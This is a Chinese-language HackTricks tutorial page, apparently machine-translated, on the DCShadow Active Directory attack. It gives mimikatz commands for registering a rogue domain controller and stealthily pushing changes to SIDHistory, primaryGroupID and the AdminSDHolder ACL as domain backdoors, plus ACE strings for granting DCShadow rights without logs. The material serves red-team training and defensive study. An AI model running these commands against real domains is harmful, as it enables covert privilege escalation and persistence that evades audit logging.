<details>

<summary><strong>从零到英雄学习AWS黑客攻击</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>


# DCShadow

它在AD中注册一个**新的域控制器**，并使用它来**推送属性**（SIDHistory, SPNs...）到指定对象**而不**留下任何关于**修改**的**日志**。您**需要DA**权限并且位于**根域**内。\
请注意，如果您使用错误的数据，将会出现非常糟糕的日志。

要执行攻击，您需要两个mimikatz实例。其中一个将以SYSTEM权限启动RPC服务器（您必须在此处指明您想要执行的更改），另一个实例将用于推送值：

{% code title="mimikatz1 (RPC服务器)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% endcode %}

{% code title="mimikatz2（推送）- 需要DA或类似权限" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

请注意，**`elevate::token`** 在 mimikatz1 会话中不起作用，因为它提升了线程的权限，但我们需要提升**进程的权限**。\
您还可以选择一个 "LDAP" 对象：`/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

您可以从具有以下最小权限的 DA 或用户推送更改：

* 在**域对象**中：
* _DS-Install-Replica_（在域中添加/删除副本）
* _DS-Replication-Manage-Topology_（管理复制拓扑）
* _DS-Replication-Synchronize_（复制同步）
* **配置容器**中的**站点对象**（及其子对象）：
* _CreateChild 和 DeleteChild_
* 注册为 DC 的**计算机对象**：
* _WriteProperty_（非写入）
* **目标对象**：
* _WriteProperty_（非写入）

您可以使用 [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) 为无特权用户授予权限（请注意，这将留下一些日志）。这比拥有 DA 权限要严格得多。\
例如：`Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` 这意味着用户名 _**student1**_ 在机器 _**mcorp-student1**_ 上登录时，对对象 _**root1user**_ 有 DCShadow 权限。

## 使用 DCShadow 创建后门

{% code title="将企业管理员设置在用户的 SIDHistory 中" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% endcode %}

{% code title="更改PrimaryGroupID（将用户设置为域管理员的成员）" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% endcode %}

{% code title="修改AdminSDHolder的ntSecurityDescriptor（赋予用户完全控制权限）" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
```markdown
{% endcode %}

## Shadowception - 使用DCShadow赋予DCShadow权限（无修改权限日志）

我们需要在以下ACEs末尾添加我们用户的SID：

* 在域对象上：
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* 在攻击者计算机对象上：`(A;;WP;;;UserSID)`
* 在目标用户对象上：`(A;;WP;;;UserSID)`
* 在配置容器中的站点对象上：`(A;CI;CCDC;;;UserSID)`

获取对象当前的ACE：`(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

注意，在这种情况下，你需要进行**多个更改**，而不仅仅是一个。因此，在**mimikatz1会话**（RPC服务器）中使用参数**`/stack`与你想要进行的每个更改**。这样，你只需要**`/push`**一次就可以在流氓服务器上执行所有堆叠的更改。



[**关于DCShadow的更多信息在ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)


<details>

<summary><strong>从零开始学习AWS黑客攻击直到成为英雄，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果你想在**HackTricks中看到你的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享你的黑客技巧。

</details>
```
